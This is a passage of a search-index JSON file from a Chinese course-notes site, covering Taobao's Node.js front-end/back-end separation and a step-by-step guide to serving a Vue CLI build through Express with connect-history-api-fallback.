\u4e2d\u53bb\u4ee3\u7406\u8fd9 5 \u4e2a\u5f02\u6b65\u8bf7\u6c42\uff0c\u8fd8\u80fd\u5f88\u5bb9\u6613\u7684\u505a Bigpipe\uff0c\u8fd9\u5757\u7684\u4f18\u5316\u80fd\u8ba9\u6574\u4e2a\u6e32\u67d3\u6548\u7387\u63d0\u5347\u5f88\u591a\u3002 \u53ef\u80fd\u5728 PC \u4e0a\u4f60\u89c9\u5f97\u53d1 5\u30016 \u4e2a\u5f02\u6b65\u8bf7\u6c42\u4e5f\u6ca1\u4ec0\u4e48\uff0c\u4f46\u662f\u5728\u65e0\u7ebf\u7aef\uff0c\u5728\u5ba2\u6237\u624b\u673a\u4e0a\u5efa\u7acb\u4e00\u4e2a HTTP \u8bf7\u6c42\u5f00\u9500\u5f88\u5927\uff0c\u6709\u4e86\u8fd9\u4e2a\u4f18\u5316\uff0c\u6027\u80fd\u4e00\u4e0b\u63d0\u5347\u597d\u51e0\u500d\u3002 \u6dd8\u5b9d\u8be6\u60c5\u57fa\u4e8e Node.js \u7684\u4f18\u5316\u6211\u4eec\u6b63\u5728\u8fdb\u884c\u4e2d\uff0c\u4e0a\u7ebf\u4e4b\u540e\u6211\u4f1a\u5206\u4eab\u4e00\u4e0b\u4f18\u5316\u7684\u8fc7\u7a0b\u3002","title":"3.3. \u6027\u80fd\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#34","text":"\u76f8\u5bf9\u4e8e\u53ea\u5207\u9875\u9762/\u505a demo\uff0c\u80af\u5b9a\u662f\u589e\u52a0\u4e86\u4e00\u70b9\uff0c\u4f46\u662f\u5f53\u524d\u6a21\u5f0f\u4e0b\u6709\u8054\u8c03\u3001\u6c9f\u901a\u73af\u8282\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u975e\u5e38\u82b1\u65f6\u95f4\uff0c\u4e5f\u5bb9\u6613\u51fa bug\uff0c\u8fd8\u5f88\u96be\u7ef4\u62a4\u3002\u6240\u4ee5\uff0c\u867d\u7136\u5de5\u4f5c\u91cf\u4f1a\u589e\u52a0\u4e00\u70b9\uff0c\u4f46\u662f\u603b\u4f53\u5f00\u53d1\u6548\u7387\u4f1a\u63d0\u5347\u5f88\u591a\u3002 \u53e6\u5916\uff0c\u6d4b\u8bd5\u6210\u672c\u53ef\u4ee5\u8282\u7701\u5f88\u591a\u3002\u4ee5\u524d\u5f00\u53d1\u7684\u63a5\u53e3\u90fd\u662f\u9488\u5bf9\u8868\u73b0\u5c42\u7684\uff0c\u5f88\u96be\u5199\u6d4b\u8bd5\u7528\u4f8b\u3002\u5982\u679c\u505a\u4e86\u524d\u540e\u7aef\u5206\u79bb\uff0c\u751a\u81f3\u6d4b\u8bd5\u90fd\u53ef\u4ee5\u5206\u5f00\uff0c\u4e00\u62e8\u4eba\u4e13\u95e8\u6d4b\u8bd5\u63a5\u53e3\uff0c\u4e00\u62e8\u4eba\u4e13\u6ce8\u6d4b\u8bd5 UI\uff08\u8fd9\u90e8\u5206\u5de5\u4f5c\u751a\u81f3\u53ef\u4ee5\u7528\u5de5\u5177\u4ee3\u66ff\uff09\u3002","title":"3.4. \u524d\u7aef\u7684\u5de5\u4f5c\u91cf\u662f\u5426\u589e\u52a0\u4e86"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#35-nodejs","text":"\u968f\u7740 Node.js \u5927\u89c4\u6a21\u4f7f\u7528\uff0c\u7cfb\u7edf/\u8fd0\u7ef4/\u5b89\u5168\u90e8\u95e8\u7684\u540c\u5b66\u4e5f\u4e00\u5b9a\u4f1a\u52a0\u5165\u5230\u57fa\u7840\u5efa\u8bbe\u4e2d\uff0c\u4ed6\u4eec\u4f1a\u5e2e\u52a9\u6211\u4eec\u53bb\u5b8c\u5584\u5404\u4e2a\u73af\u8282\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898\uff0c\u4fdd\u969c\u7cfb\u7684\u7a33\u5b9a\u6027\u3002","title":"3.5. \u589e\u52a0 Node.js \u5c42\u5e26\u6765\u7684\u98ce\u9669\u600e\u4e48\u63a7\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#36-nodejs-java","text":"\u6211\u4eec\u7684\u521d\u8877\u662f\u505a\u524d\u540e\u7aef\u5206\u79bb\uff0c\u5982\u679c\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\u5c31\u6709\u70b9\u8fdd\u80cc\u6211\u4eec\u7684\u521d\u8877\u4e86\u3002\u5373\u4f7f\u7528 Node.js \u66ff\u4ee3 Java\uff0c\u6211\u4eec\u4e5f\u6ca1\u529e\u6cd5\u4fdd\u8bc1\u4e0d\u51fa\u73b0\u4eca\u5929\u9047\u5230\u7684\u79cd\u79cd\u95ee\u9898\uff0c\u6bd4\u5982\u804c\u8d23\u4e0d\u6e05\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5206\u5c42\u5f00\u53d1\uff0c\u4e13\u4e1a\u7684\u4eba\uff0c\u4e13\u6ce8\u505a\u4e13\u4e1a\u7684\u4e8b\u3002\u57fa\u4e8e Java \u7684\u57fa\u7840\u67b6\u6784\u5df2\u7ecf\u975e\u5e38\u5f3a\u5927\u800c\u4e14\u7a33\u5b9a\uff0c\u800c\u4e14\u66f4\u9002\u5408\u505a\u73b0\u5728\u67b6\u6784\u7684\u4e8b\u60c5\u3002","title":"3.6. Node.js \u4ec0\u4e48\u90fd\u80fd\u505a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981 Java"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#4-nodejs","text":"\\text{Figure 3. \u6dd8\u5b9d\u57fa\u4e8eNode.js\u7684\u524d\u540e\u7aef\u5206\u79bb} \u4e0a\u56fe\u662f\u6211\u7406\u89e3\u7684\u6dd8\u5b9d\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\u5206\u5c42\uff0c\u4ee5\u53ca Node.js \u7684\u804c\u8d23\u8303\u56f4\u3002\u7b80\u5355\u89e3\u91ca\u4e0b\uff1a \u6700\u4e0a\u7aef\u662f\u670d\u52a1\u7aef\uff0c\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u540e\u7aef\u3002\u540e\u7aef\u5bf9\u4e8e\u6211\u4eec\u6765\u8bf4\uff0c\u5c31\u662f\u4e00\u4e2a\u63a5\u53e3\u7684\u96c6\u5408\uff0c\u670d\u52a1\u7aef\u63d0\u4f9b\u5404\u79cd\u5404\u6837\u7684\u63a5\u53e3\u4f9b\u6211\u4eec\u4f7f\u7528\u3002\u56e0\u4e3a\u6709 Node.js \u5c42\uff0c\u4e5f\u4e0d\u7528\u5c40\u9650\u662f\u4ec0\u4e48\u5f62\u5f0f\u7684\u670d\u52a1\u3002\u5bf9\u4e8e\u540e\u7aef\u5f00\u53d1\u6765\u8bf4\uff0c\u4ed6\u4eec\u53ea\u7528\u5173\u5fc3\u4e1a\u52a1\u4ee3\u7801\u7684\u63a5\u53e3\u5b9e\u73b0\u3002 \u670d\u52a1\u7aef\u4e0b\u9762\u662f Node.js \u5e94\u7528\u3002 Node.js \u5e94\u7528\u4e2d\u6709\u4e00\u5c42 Model Proxy \u4e0e\u670d\u52a1\u7aef\u8fdb\u884c\u901a\u8baf\u3002\u8fd9\u4e00\u5c42\u4e3b\u8981\u76ee\u524d\u662f\u62b9\u5e73\u6211\u4eec\u5bf9\u4e0d\u540c\u63a5\u53e3\u7684\u8c03\u7528\u65b9\u5f0f\uff0c\u5c01\u88c5\u4e00\u4e9b View \u5c42\u9700\u8981\u7684 Model\u3002 Node.js \u5c42\u8fd8\u80fd\u8f7b\u677e\u5b9e\u73b0\u539f\u6765 vmcommon, tms\uff08\u5f15\u7528\u6dd8\u5b9d\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff09\u7b49\u9700\u6c42\u3002 Node.js \u5c42\u8981\u4f7f\u7528\u4ec0\u4e48\u6846\u67b6\u7531\u5f00\u53d1\u8005\u81ea\u5df1\u51b3\u5b9a\u3002\u4e0d\u8fc7\u63a8\u8350\u4f7f\u7528 Express + XTemplate \u7684\u7ec4\u5408\uff0cXTemplate \u80fd\u505a\u5230\u524d\u540e\u7aef\u516c\u7528\u3002 \u600e\u4e48\u7528 Node.js \u5927\u5bb6\u81ea\u5df1\u51b3\u5b9a\uff0c\u4f46\u662f\u4ee4\u4eba\u5174\u594b\u7684\u662f\uff0c\u6211\u4eec\u7ec8\u4e8e\u53ef\u4ee5\u4f7f\u7528 Node.js \u8f7b\u677e\u5b9e\u73b0\u6211\u4eec\u60f3\u8981\u7684\u8f93\u51fa\u65b9\u5f0f\uff1a JSON/JSONP/RESTful/HTML/BigPipe/Comet/Socket/\u540c\u6b65\u3001\u5f02\u6b65\uff0c\u60f3\u600e\u4e48\u6574\u5c31\u600e\u4e48\u6574\uff0c\u5b8c\u5168\u6839\u636e\u4f60\u7684\u573a\u666f\u51b3\u5b9a\u3002 \u6d4f\u89c8\u5668\u5c42\u5728\u6211\u4eec\u8fd9\u4e2a\u67b6\u6784\u4e2d\u6ca1\u6709\u53d8\u5316\uff0c\u4e5f\u4e0d\u5e0c\u671b\u56e0\u4e3a\u5f15\u5165 Node.js \u6539\u53d8\u4f60\u4ee5\u524d\u5728\u6d4f\u89c8\u5668\u4e2d\u5f00\u53d1\u7684\u8ba4\u77e5\u3002 \u5f15\u5165 Node.js\uff0c\u53ea\u662f\u628a\u672c\u8be5\u5c31\u524d\u7aef\u63a7\u5236\u7684\u90e8\u5206\u4ea4\u7531\u524d\u7aef\u638c\u63a7\u3002 \u8fd9\u79cd\u6a21\u5f0f\u6211\u4eec\u5df2\u7ecf\u6709\u4e24\u4e2a\u9879\u76ee\u5728\u5f00\u53d1\u4e2d\uff0c\u867d\u7136\u8fd8\u6ca1\u4e0a\u7ebf\uff0c\u4f46\u662f\u65e0\u8bba\u662f\u5728\u5f00\u53d1\u6548\u7387\uff0c\u8fd8\u662f\u5728\u6027\u80fd\u4f18\u5316\u65b9\u9762\uff0c\u6211\u4eec\u90fd\u5df2\u7ecf\u5c1d\u5230\u4e86\u751c\u5934\u3002","title":"4. \u6dd8\u5b9d\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#5","text":"\u628a Node.js \u7684\u5f00\u53d1\u6d41\u7a0b\u96c6\u6210\u5230\u6dd8\u5b9d\u73b0\u6709\u7684 SCM \u6d41\u7a0b\u4e2d\u3002 \u57fa\u7840\u8bbe\u65bd\u5efa\u8bbe\uff0c\u6bd4\u5982 session, logger \u7b49\u901a\u7528\u6a21\u5757\u3002 \u6700\u4f73\u5f00\u53d1\u5b9e\u8df5 \u7ebf\u4e0a\u6210\u529f\u6848\u4f8b \u5927\u5bb6\u5bf9 Node.js \u524d\u540e\u7aef\u5206\u79bb\u6982\u5ff5\u7684\u8ba4\u8bc6 \u5b89\u5168 \u6027\u80fd \u2026 \u6280\u672f\u4e0a\u4e0d\u4f1a\u6709\u592a\u591a\u9700\u8981\u53bb\u521b\u65b0\u548c\u7814\u7a76\u7684\uff0c\u5df2\u7ecf\u6709\u975e\u5e38\u591a\u73b0\u6210\u7684\u79ef\u7d2f\u3002\u5176\u5b9e\u5173\u952e\u662f\u4e00\u4e9b\u6d41\u7a0b\u7684\u6253\u901a\u548c\u901a\u7528\u89e3\u51b3\u65b9\u6848\u7684\u79ef\u7d2f\uff0c\u76f8\u4fe1\u968f\u7740\u66f4\u591a\u7684\u9879\u76ee\u5b9e\u8df5\uff0c\u8fd9\u5757\u6162\u6162\u4f1a\u53d8\u6210\u4e00\u4e2a\u7a33\u5b9a\u7684\u6d41\u7a0b\u3002","title":"5. \u6211\u4eec\u8fd8\u9700\u8981\u8981\u505a\u4ec0\u4e48"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#6","text":"\u867d\u7136\u201c\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f0f\u5f00\u53d1\u201d\u6a21\u5f0f\u5f88\u8ba9\u4eba\u5174\u594b\uff0c\u4f46\u662f\u628a\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f00\u53d1\u53d8\u6210\u4e00\u4e2a\u7a33\u5b9a\uff0c\u8ba9\u5927\u5bb6\u90fd\u80fd\u63a5\u53d7\u7684\u4e1c\u897f\u8fd8\u6709\u5f88\u591a\u8def\u8981\u8d70\uff0c\u6211\u4eec\u6b63\u5728\u8fdb\u884c\u7684\u201c\u4e2d\u9014\u5c9b\u201d\u9879\u76ee\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u867d\u7136\u6211\u4eec\u8d77\u6b65\u4e0d\u4e45\uff0c\u4f46\u662f\u79bb\u76ee\u6807\u5df2\u7ecf\u8d8a\u6765\u8d8a\u8fd1\uff01\uff01","title":"6. \u201c\u4e2d\u9014\u5c9b\u201d"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/","text":"\u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee # \u76ee\u5f55 # \u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee \u76ee\u5f55 1. \u80cc\u666f 2. \u914d\u7f6eVue CLI 2.1. \u5b89\u88c5Node.js 2.2. \u5b89\u88c5Vue CLI 2.3. \u521b\u5efaVue\u9879\u76ee 2.4. \u6784\u5efaVue\u9879\u76ee 3. \u914d\u7f6eExpress 3.1. \u5b89\u88c5Express 3.2. \u521b\u5efa\u9879\u76ee 4. \u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee 1. \u80cc\u666f # \u6211\u4eec\u60f3\u8981\u505a\u4e00\u4e2a\u524d\u540e\u7aef\u5206\u79bb\u7684\u8bfe\u7a0b\u9879\u76ee\uff0c\u524d\u7aef\u6846\u67b6\u51c6\u5907\u4f7f\u7528 Vue.js \uff0c\u5e76\u4f7f\u7528 Express \u4f5c\u4e3a Node.js \u4e2d\u95f4\u4ef6\u8fdb\u884c\u90e8\u7f72\uff0c\u540e\u7aef\u4f7f\u7528 Java Servlet \u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u3002 \u4f46\u6211\u5728\u5c1d\u8bd5\u6839\u636e\u7f51\u7edc\u4e0a\u7684\u4e00\u4e9b\u6559\u7a0b\u5c06 Vue.js \u6784\u5efa\u597d\u7684\u9879\u76ee\u90e8\u7f72\u5230 Express \u4e0a\u65f6\uff0c\u53d1\u73b0\u9875\u9762\u603b\u662f\u663e\u793a\u4e0d\u51fa\u6765\uff0cHTML\u91cc\u7684\u63d0\u793a\u662f We're sorry but hello-world doesn't work properly without JavaScript enabled. Please enable it to continue. \u6240\u4ee5\u6211\u5c1d\u8bd5\u5728 Vue CLI\u7684\u5b98\u7f51 \u5bfb\u627e\u90e8\u7f72\u65b9\u6848\u3002\u53d1\u73b0 \u5b98\u65b9\u63a8\u8350\u7684\u90e8\u7f72\u5728Express\u4e0a\u7684\u65b9\u6848 \u662f\u4f7f\u7528 connect-history-api-fallback \u4e2d\u95f4\u4ef6 \u3002\u4e8e\u662f\u6211\u628a\u5177\u4f53\u7684\u90e8\u7f72\u6d41\u7a0b\u5199\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002 2. \u914d\u7f6eVue CLI # \u6b64\u90e8\u5206\u53c2\u8003\u81ea Vue CLI \u5b98\u65b9\u6587\u6863 2.1. \u5b89\u88c5Node.js # \u524d\u5f80\u5b98\u7f51 https://nodejs.org/en/download/ \u8fdb\u884c\u4e0b\u8f7d\uff0c\u56fe\u5f62\u754c\u9762\u5b89\u88c5\uff0c\u6309\u7167\u63d0\u793a\u8fdb\u884c\u5373\u53ef Mac OS\u4e5f\u53ef\u4ee5\u7528brew\u5b89\u88c5 brew install node 2.2. \u5b89\u88c5Vue CLI # npm install -g @vue/cli # OR yarn global add @vue/cli \u67e5\u770b\u662f\u5426\u5b89\u88c5\u6210\u529f vue --version 2.3. \u521b\u5efaVue\u9879\u76ee # \u547d\u4ee4\u884c\u8fdb\u5165\u4e00\u4e2a\u4f60\u60f3\u5b89\u88c5\u7684\u6587\u4ef6\u5939\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4 vue create hello-world \u4f60\u4f1a\u88ab\u63d0\u793a\u9009\u53d6\u4e00\u4e2a preset\u3002\u4f60\u53ef\u4ee5\u9009\u9ed8\u8ba4\u7684\u5305\u542b\u4e86\u57fa\u672c\u7684 Babel + ESLint \u8bbe\u7f6e\u7684 preset\uff0c\u4e5f\u53ef\u4ee5\u9009\u201c\u624b\u52a8\u9009\u62e9\u7279\u6027\u201d\u6765\u9009\u53d6\u9700\u8981\u7684\u7279\u6027\u3002 \\text{Figure 1. CLI new project} \u8fd9\u4e2a\u9ed8\u8ba4\u7684\u8bbe\u7f6e\u975e\u5e38\u9002\u5408\u5feb\u901f\u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee\u7684\u539f\u578b\uff0c\u800c\u624b\u52a8\u8bbe\u7f6e\u5219\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u9009\u9879\uff0c\u5b83\u4eec\u662f\u9762\u5411\u751f\u4ea7\u7684\u9879\u76ee\u66f4\u52a0\u9700\u8981\u7684\u3002 \\text{Figure 2. CLI select features} \u8fd0\u884c\u9879\u76ee cd hello-world npm run serve \\text{Figure 3. Npm run serve} \u8bbf\u95ee\u663e\u793a\u7684url\u4f1a\u51fa\u73b0Vue\u7684\u6b22\u8fce\u754c\u9762 \\text{Figure 4. Web index} 2.4. \u6784\u5efaVue\u9879\u76ee # \u901a\u8fc7 Ctrl-C \u505c\u6b62\u8fd0\u884c\u540e\uff0c\u6784\u5efa\u9879\u76ee\u3002\u6253\u5305\u597d\u7684\u6587\u4ef6\u4f1a\u5b58\u653e\u5728dist\u6587\u4ef6\u5939\u4e0b\u3002 npm run build \u4f46\u662fdist\u6587\u4ef6\u5939\u4e0b\u7684 index.html \u6211\u4eec\u901a\u8fc7\u672c\u5730\u6d4f\u89c8\u5668\u662f\u6253\u4e0d\u5f00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a Node.js \u670d\u52a1\u5668\uff0c\u6211\u4f7f\u7528\u7684\u662f Express \u3002\u4e0b\u9762\u5c31\u8fdb\u5165 Express \u7684\u914d\u7f6e\u3002 3. \u914d\u7f6eExpress # \u6b64\u90e8\u5206\u5185\u5bb9\u53c2\u8003\u81ea Express\u5b98\u65b9\u6587\u6863 \u3002 3.1. \u5b89\u88c5Express # \u9996\u5148\u9000\u51fa\u521a\u624d\u521b\u5efa\u7684Vue\u9879\u76ee\u6587\u4ef6\u5939 cd .. \u7136\u540e\u521b\u5efaExpress\u6587\u4ef6\u5939\u5e76\u8fdb\u5165\u5176\u4e2d mkdir myapp cd myapp \u901a\u8fc7 npm init \u547d\u4ee4\u4e3a\u4f60\u7684\u5e94\u7528\u521b\u5efa\u4e00\u4e2a package.json \u6587\u4ef6\u3002 npm init \u6b64\u547d\u4ee4\u5c06\u8981\u6c42\u4f60\u8f93\u5165\u51e0\u4e2a\u53c2\u6570\uff0c\u4f8b\u5982\u6b64\u5e94\u7528\u7684\u540d\u79f0\u548c\u7248\u672c\u3002 \u4f60\u53ef\u4ee5\u76f4\u63a5\u6309\u201c\u56de\u8f66\u201d\u952e\u63a5\u53d7\u5927\u90e8\u5206\u9ed8\u8ba4\u8bbe\u7f6e\u5373\u53ef\uff0c\u4e0b\u9762\u8fd9\u4e2a\u9664\u5916\uff1a entry point: (index.js) \u952e\u5165 app.js \u6216\u8005\u4f60\u6240\u5e0c\u671b\u7684\u540d\u79f0\uff0c\u8fd9\u662f\u5f53\u524d\u5e94\u7528\u7684\u5165\u53e3\u6587\u4ef6\u3002\u5982\u679c\u4f60\u5e0c\u671b\u91c7\u7528\u9ed8\u8ba4\u7684 index.js \u6587\u4ef6\u540d\uff0c\u53ea\u9700\u6309\u201c\u56de\u8f66\u201d\u952e\u5373\u53ef\u3002 \u63a5\u4e0b\u6765\u5728 myapp \u76ee\u5f55\u4e0b\u5b89\u88c5 Express \u5e76\u5c06\u5176\u4fdd\u5b58\u5230\u4f9d\u8d56\u5217\u8868\u4e2d\u3002\u5982\u4e0b\uff1a npm install express --save 3.2. \u521b\u5efa\u9879\u76ee # \u901a\u8fc7\u5e94\u7528\u751f\u6210\u5668\u5de5\u5177 express-generator \u53ef\u4ee5\u5feb\u901f\u521b\u5efa\u4e00\u4e2a\u5e94\u7528\u7684\u9aa8\u67b6\u3002 npx express-generator \u5bf9\u4e8e\u8f83\u8001\u7684 Node \u7248\u672c\uff0c\u8bf7\u901a\u8fc7 npm \u5c06 Express \u5e94\u7528\u7a0b\u5e8f\u751f\u6210\u5668\u5b89\u88c5\u5230\u5168\u5c40\u73af\u5883\u4e2d\u5e76\u6267\u884c\u5373\u53ef\u3002 npm install -g express-generator express \u5b89\u88c5\u65f6\u4f1a\u63d0\u793a\u6587\u4ef6\u5939\u975e\u7a7a\uff0c\u662f\u5426\u786e\u5b9a\u5b89\u88c5\uff0c\u8f93\u5165y\u7136\u540e\u56de\u8f66\u5373\u53ef \\text{Figure 5. Express generator} \u7136\u540e\u5b89\u88c5\u6240\u6709\u4f9d\u8d56\u5305\uff1a npm install \u5728 MacOS \u6216 Linux \u4e2d\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u542f\u52a8\u6b64\u5e94\u7528\uff1a DEBUG=myapp:* npm start \u5728 Windows \u4e2d\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u542f\u52a8\u6b64\u5e94\u7528\uff1a set DEBUG=myapp:* & npm start \u7136\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 http://localhost:3000/ \u7f51\u5740\u5c31\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u5e94\u7528\u4e86\u3002 \\text{Figure 6. Express index} \u540c\u6837\u4f7f\u7528 Ctrl-C \u505c\u6b62\u8fd0\u884c\uff0c\u4e0b\u9762\u5c06Vue\u9879\u76ee\u6784\u5efa\u7684\u6587\u4ef6\u90e8\u7f72\u5230Express\u3002 4. \u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee # \u5c06Vue\u9879\u76ee hello-world \u76ee\u5f55\u4e2d\u7684dist\u6587\u4ef6\u5939\u590d\u5236\u5230 Express\u9879\u76ee myapp \u6587\u4ef6\u5939\u3002 \u76f4\u63a5\u590d\u5236\u8fc7\u53bb\u4e5f\u53ef\u4ee5\uff0c\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u884c\u590d\u5236\u4e5f\u53ef\u4ee5\u3002 mkdir dist cp -a ../hello-world/dist/ ./dist \u590d\u5236\u5b8c\u6210\u540e\uff0cmyapp\u6587\u4ef6\u5939\u7684\u76ee\u5f55\u6811\u5e94\u8be5\u662f\u8fd9\u6837\u7684 xxx/myapp \u251c\u2500\u2500 app.js \u251c\u2500\u2500 bin \u251c\u2500\u2500 dist \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u251c\u2500\u2500 routes \u2514\u2500\u2500 views \u5b89\u88c5 connect-history-api-fallback \u4e2d\u95f4\u4ef6 npm install --save connect-history-api-fallback \u5b89\u88c5\u5b8c\u6210\u4ee5\u540e\uff0c\u4fee\u6539app.js var createError = require('http-errors'); var express = require('express'); var path = require('path'); var cookieParser = require('cookie-parser'); var logger = require('morgan'); var indexRouter = require('./routes/index'); var usersRouter = require('./routes/users'); var app = express(); // view engine setup app.set('views', path.join(__dirname, 'views')); app.set('view engine', 'jade'); app.use(logger('dev')); app.use(express.json()); app.use(express.urlencoded({ extended: false })); app.use(cookieParser()); app.use(express.static(path.join(__dirname, 'public'))); // ----------------\u8fd9\u4e24\u884c\u88ab\u6211\u4eec\u6ce8\u91ca\u6389\u4e86----------- // app.use('/', indexRouter); // app.use('/users', usersRouter); //--------------------------------------------- // ----------------\u8fd9\u4e09\u884c\u662f\u6211\u4eec\u65b0\u6dfb\u52a0\u7684----------- var history = require('connect-history-api-fallback'); app.use(express.static(path.join(__dirname, 'dist'))); app.use(history()); //--------------------------------------------- // catch 404 and forward to error handler app.use(function(req, res, next) { next(createError(404)); }); // error handler app.use(function(err, req, res, next) { // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : {}; // render the error page res.status(err.status || 500); res.render('error'); }); module.exports = app; \u5728\u6211\u6807\u8bb0\u7684\u5730\u65b9\u52a0\u5165\u4e86\u4e0b\u97623\u6761\u8bed\u53e5\uff0c\u5c06\u4e2d\u95f4\u4ef6\u52a0\u5165\u4e86\u5176\u4e2d\u3002\u5e76\u4e14\u6ce8\u91ca\u6389\u4e86\u524d\u9762\u7684\u4e24\u6761\u8bed\u53e5\uff0c\u8ba9\u9875\u9762\u81ea\u52a8\u8bbf\u95ee index.html \u3002 // ----------------\u8fd9\u4e24\u884c\u88ab\u6211\u4eec\u6ce8\u91ca\u6389\u4e86----------- // app.use('/', indexRouter); // app.use('/users', usersRouter); //--------------------------------------------- // ----------------\u8fd9\u4e09\u884c\u662f\u6211\u4eec\u65b0\u6dfb\u52a0\u7684----------- var history = require('connect-history-api-fallback'); app.use(express.static(path.join(__dirname, 'dist'))); app.use(history()); //--------------------------------------------- \u542f\u52a8Express npm start \u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 http://localhost:3000/ \uff0c\u770b\u5230Vue\u7684\u754c\u9762\u5c31\u5927\u529f\u544a\u6210\u4e86\u3002 \\text{Figure 7. Vue index\u5728Express\u4e2d\u663e\u793a\u6210\u529f} \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#expressvue","text":"","title":"\u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#_1","text":"\u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee \u76ee\u5f55 1. \u80cc\u666f 2. \u914d\u7f6eVue CLI 2.1. \u5b89\u88c5Node.js 2.2. \u5b89\u88c5Vue CLI 2.3. \u521b\u5efaVue\u9879\u76ee 2.4. \u6784\u5efaVue\u9879\u76ee 3. \u914d\u7f6eExpress 3.1. \u5b89\u88c5Express 3.2. \u521b\u5efa\u9879\u76ee 4. 